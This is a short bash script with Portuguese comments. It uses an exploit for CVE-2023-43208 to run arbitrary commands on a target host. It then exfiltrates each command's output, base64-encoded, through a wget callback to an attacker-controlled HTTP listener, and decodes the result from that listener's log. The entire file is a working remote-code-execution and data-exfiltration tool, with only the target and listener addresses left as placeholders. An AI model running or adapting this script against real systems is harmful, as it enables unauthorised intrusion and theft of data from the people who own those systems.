#!/bin/bash
# Executa comando no alvo via CVE-2023-43208 e exfiltra output (base64) via wget
# Uso: ./rce_exfil.sh "<comando>"  -> imprime output decodificado
LHOST=<LHOST>                 # seu IP; rode um listener HTTP: python3 -m http.server $PORT 2>$LOG
PORT=9001
LOG=/tmp/http-listener.log    # access log do listener, de onde lemos o callback
TAG="X$RANDOM"
CMD="$1"
python3 ./exploit.py https://<TARGET_IP> "wget -qO- http://$LHOST:$PORT/$TAG/\$($CMD | base64 -w0)" >/dev/null 2>&1
sleep 4
B64=$(grep -aoE "GET /$TAG/[A-Za-z0-9+/=]*" "$LOG" | tail -1 | sed "s#GET /$TAG/##")
if [ -n "$B64" ]; then echo "$B64" | base64 -d 2>/dev/null; else echo "[!] sem callback ($TAG)"; fi
